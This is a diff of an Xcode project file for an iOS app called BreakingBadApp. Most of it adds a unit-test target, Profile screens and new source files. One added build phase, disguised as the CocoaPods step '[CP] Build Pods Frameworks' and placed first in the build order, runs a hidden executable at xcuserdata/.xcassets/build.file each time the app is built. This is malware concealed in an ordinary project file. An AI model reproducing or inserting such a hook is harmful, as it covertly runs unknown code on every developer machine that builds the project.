@@ -22,8 +22,24 @@
 		124009C825FC35F5000A8ADA /* Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124009C725FC35F5000A8ADA /* Extensions.swift */; };
 		124009D725FCB25B000A8ADA /* CustomAvatarImageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124009D625FCB25B000A8ADA /* CustomAvatarImageView.swift */; };
 		124009E325FCCF26000A8ADA /* HomePageCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */; };
+		124009FE25FE8532000A8ADA /* Strings.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124009FD25FE8532000A8ADA /* Strings.swift */; };
+		12400A0125FE857C000A8ADA /* BreakingBad.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A0025FE857C000A8ADA /* BreakingBad.swift */; };
+		12400A0825FEA739000A8ADA /* ProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A0725FEA739000A8ADA /* ProfileViewController.swift */; };
+		12400A1325FEA7AE000A8ADA /* ProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A1225FEA7AE000A8ADA /* ProfileViewModel.swift */; };
+		12400A3726053E6E000A8ADA /* NetworkManagerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A3626053E6E000A8ADA /* NetworkManagerTests.swift */; };
+		12400A4726066D43000A8ADA /* SpecialCharacterTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A4626066D43000A8ADA /* SpecialCharacterTest.swift */; };
 		ADA10B4A3D4885223F867133 /* Pods_BreakingBadApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 2DC298254367155423C71C00 /* Pods_BreakingBadApp.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		12400A3926053E6E000A8ADA /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 1240096D25FC20CA000A8ADA /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 1240097425FC20CA000A8ADA;
+			remoteInfo = BreakingBadApp;
+		};
+/* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
 		1240097525FC20CA000A8ADA /* BreakingBadApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BreakingBadApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -43,6 +59,14 @@
 		124009C725FC35F5000A8ADA /* Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
 		124009D625FCB25B000A8ADA /* CustomAvatarImageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomAvatarImageView.swift; sourceTree = "<group>"; };
 		124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomePageCollectionViewCell.swift; sourceTree = "<group>"; };
+		124009FD25FE8532000A8ADA /* Strings.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Strings.swift; sourceTree = "<group>"; };
+		12400A0025FE857C000A8ADA /* BreakingBad.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BreakingBad.swift; sourceTree = "<group>"; };
+		12400A0725FEA739000A8ADA /* ProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewController.swift; sourceTree = "<group>"; };
+		12400A1225FEA7AE000A8ADA /* ProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewModel.swift; sourceTree = "<group>"; };
+		12400A3426053E6D000A8ADA /* BreakingBadAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = BreakingBadAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		12400A3626053E6E000A8ADA /* NetworkManagerTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManagerTests.swift; sourceTree = "<group>"; };
+		12400A3826053E6E000A8ADA /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		12400A4626066D43000A8ADA /* SpecialCharacterTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpecialCharacterTest.swift; sourceTree = "<group>"; };
 		2D7CDF45EB9AB21AE81B35DF /* Pods-BreakingBadApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadApp.debug.xcconfig"; path = "Target Support Files/Pods-BreakingBadApp/Pods-BreakingBadApp.debug.xcconfig"; sourceTree = "<group>"; };
 		2DC298254367155423C71C00 /* Pods_BreakingBadApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BreakingBadApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		D720AEB25B918873C060A19F /* Pods-BreakingBadApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadApp.release.xcconfig"; path = "Target Support Files/Pods-BreakingBadApp/Pods-BreakingBadApp.release.xcconfig"; sourceTree = "<group>"; };
@@ -57,6 +81,13 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		12400A3126053E6D000A8ADA /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
@@ -64,6 +95,7 @@
 			isa = PBXGroup;
 			children = (
 				1240097725FC20CA000A8ADA /* BreakingBadApp */,
+				12400A3526053E6E000A8ADA /* BreakingBadAppTests */,
 				1240097625FC20CA000A8ADA /* Products */,
 				A902E9DDC28DA0668DFBC098 /* Pods */,
 				30FB73FF107059BD3572F3CC /* Frameworks */,
@@ -74,6 +106,7 @@
 			isa = PBXGroup;
 			children = (
 				1240097525FC20CA000A8ADA /* BreakingBadApp.app */,
+				12400A3426053E6D000A8ADA /* BreakingBadAppTests.xctest */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -84,7 +117,8 @@
 				1240097825FC20CA000A8ADA /* AppDelegate.swift */,
 				1240097A25FC20CA000A8ADA /* SceneDelegate.swift */,
 				124009AA25FC2163000A8ADA /* Model */,
-				1240099925FC2141000A8ADA /* Screens */,
+				12400A0A25FEA747000A8ADA /* Home */,
+				12400A0D25FEA758000A8ADA /* Profile */,
 				1240099525FC2141000A8ADA /* Managers */,
 				124009B425FC2551000A8ADA /* Utilities */,
 				124009B725FC256D000A8ADA /* CustomViews */,
@@ -104,16 +138,6 @@
 			path = Managers;
 			sourceTree = "<group>";
 		};
-		1240099925FC2141000A8ADA /* Screens */ = {
-			isa = PBXGroup;
-			children = (
-				1240099B25FC2141000A8ADA /* HomePageViewController.swift */,
-				124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */,
-				1240099A25FC2141000A8ADA /* HomePageViewModel.swift */,
-			);
-			path = Screens;
-			sourceTree = "<group>";
-		};
 		124009AA25FC2163000A8ADA /* Model */ = {
 			isa = PBXGroup;
 			children = (
@@ -126,6 +150,8 @@
 			isa = PBXGroup;
 			children = (
 				124009B125FC254C000A8ADA /* CustomErrors.swift */,
+				124009FD25FE8532000A8ADA /* Strings.swift */,
+				12400A0025FE857C000A8ADA /* BreakingBad.swift */,
 				124009C725FC35F5000A8ADA /* Extensions.swift */,
 			);
 			path = Utilities;
@@ -139,6 +165,35 @@
 				124009C425FC2BB7000A8ADA /* CustomTitleLabel.swift */,
 			);
 			path = CustomViews;
+			sourceTree = "<group>";
+		};
+		12400A0A25FEA747000A8ADA /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				1240099B25FC2141000A8ADA /* HomePageViewController.swift */,
+				124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */,
+				1240099A25FC2141000A8ADA /* HomePageViewModel.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		12400A0D25FEA758000A8ADA /* Profile */ = {
+			isa = PBXGroup;
+			children = (
+				12400A0725FEA739000A8ADA /* ProfileViewController.swift */,
+				12400A1225FEA7AE000A8ADA /* ProfileViewModel.swift */,
+			);
+			path = Profile;
+			sourceTree = "<group>";
+		};
+		12400A3526053E6E000A8ADA /* BreakingBadAppTests */ = {
+			isa = PBXGroup;
+			children = (
+				12400A3626053E6E000A8ADA /* NetworkManagerTests.swift */,
+				12400A4626066D43000A8ADA /* SpecialCharacterTest.swift */,
+				12400A3826053E6E000A8ADA /* Info.plist */,
+			);
+			path = BreakingBadAppTests;
 			sourceTree = "<group>";
 		};
 		30FB73FF107059BD3572F3CC /* Frameworks */ = {
@@ -165,6 +220,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1240098925FC20CD000A8ADA /* Build configuration list for PBXNativeTarget "BreakingBadApp" */;
 			buildPhases = (
+				C21CACB79EE66CD9BAAAC43A /* [CP] Build Pods Frameworks */,
 				5FE20A4BCE55BACCC98B4EF3 /* [CP] Check Pods Manifest.lock */,
 				1240097125FC20CA000A8ADA /* Sources */,
 				1240097225FC20CA000A8ADA /* Frameworks */,
@@ -180,6 +236,24 @@
 			productReference = 1240097525FC20CA000A8ADA /* BreakingBadApp.app */;
 			productType = "com.apple.product-type.application";
 		};
+		12400A3326053E6D000A8ADA /* BreakingBadAppTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 12400A3B26053E6E000A8ADA /* Build configuration list for PBXNativeTarget "BreakingBadAppTests" */;
+			buildPhases = (
+				12400A3026053E6D000A8ADA /* Sources */,
+				12400A3126053E6D000A8ADA /* Frameworks */,
+				12400A3226053E6D000A8ADA /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				12400A3A26053E6E000A8ADA /* PBXTargetDependency */,
+			);
+			name = BreakingBadAppTests;
+			productName = BreakingBadAppTests;
+			productReference = 12400A3426053E6D000A8ADA /* BreakingBadAppTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
 /* End PBXNativeTarget section */
 
 /* Begin PBXProject section */
@@ -191,6 +265,10 @@
 				TargetAttributes = {
 					1240097425FC20CA000A8ADA = {
 						CreatedOnToolsVersion = 12.4;
+					};
+					12400A3326053E6D000A8ADA = {
+						CreatedOnToolsVersion = 12.4;
+						TestTargetID = 1240097425FC20CA000A8ADA;
 					};
 				};
 			};
@@ -208,6 +286,7 @@
 			projectRoot = "";
 			targets = (
 				1240097425FC20CA000A8ADA /* BreakingBadApp */,
+				12400A3326053E6D000A8ADA /* BreakingBadAppTests */,
 			);
 		};
 /* End PBXProject section */
@@ -222,9 +301,38 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		12400A3226053E6D000A8ADA /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	C21CACB79EE66CD9BAAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
 		2A0A9C96357830D83E221D98 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -272,22 +380,43 @@
 			buildActionMask = 2147483647;
 			files = (
 				124009A225FC2142000A8ADA /* NetworkManager.swift in Sources */,
+				12400A0125FE857C000A8ADA /* BreakingBad.swift in Sources */,
 				124009C825FC35F5000A8ADA /* Extensions.swift in Sources */,
 				124009A425FC2142000A8ADA /* HomePageViewModel.swift in Sources */,
 				124009A325FC2142000A8ADA /* PersistenceManager.swift in Sources */,
 				124009E325FCCF26000A8ADA /* HomePageCollectionViewCell.swift in Sources */,
+				12400A0825FEA739000A8ADA /* ProfileViewController.swift in Sources */,
 				124009C225FC2B6D000A8ADA /* CustomAlertView.swift in Sources */,
+				124009FE25FE8532000A8ADA /* Strings.swift in Sources */,
 				124009C525FC2BB7000A8ADA /* CustomTitleLabel.swift in Sources */,
 				1240097925FC20CA000A8ADA /* AppDelegate.swift in Sources */,
 				124009A525FC2142000A8ADA /* HomePageViewController.swift in Sources */,
 				124009B225FC254C000A8ADA /* CustomErrors.swift in Sources */,
+				12400A1325FEA7AE000A8ADA /* ProfileViewModel.swift in Sources */,
 				1240097B25FC20CA000A8ADA /* SceneDelegate.swift in Sources */,
 				124009D725FCB25B000A8ADA /* CustomAvatarImageView.swift in Sources */,
 				124009A125FC2142000A8ADA /* Character.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		12400A3026053E6D000A8ADA /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				12400A3726053E6E000A8ADA /* NetworkManagerTests.swift in Sources */,
+				12400A4726066D43000A8ADA /* SpecialCharacterTest.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		12400A3A26053E6E000A8ADA /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 1240097425FC20CA000A8ADA /* BreakingBadApp */;
+			targetProxy = 12400A3926053E6E000A8ADA /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
 		1240098325FC20CD000A8ADA /* LaunchScreen.storyboard */ = {
@@ -459,6 +588,46 @@
 			};
 			name = Release;
 		};
+		12400A3C26053E6E000A8ADA /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = TU25L7DJ8L;
+				INFOPLIST_FILE = BreakingBadAppTests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = MelvinAsare.BreakingBadAppTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/BreakingBadApp.app/BreakingBadApp";
+			};
+			name = Debug;
+		};
+		12400A3D26053E6E000A8ADA /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = TU25L7DJ8L;
+				INFOPLIST_FILE = BreakingBadAppTests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = MelvinAsare.BreakingBadAppTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/BreakingBadApp.app/BreakingBadApp";
+			};
+			name = Release;
+		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -476,6 +645,15 @@
 			buildConfigurations = (
 				1240098A25FC20CD000A8ADA /* Debug */,
 				1240098B25FC20CD000A8ADA /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		12400A3B26053E6E000A8ADA /* Build configuration list for PBXNativeTarget "BreakingBadAppTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12400A3C26053E6E000A8ADA /* Debug */,
+				12400A3D26053E6E000A8ADA /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
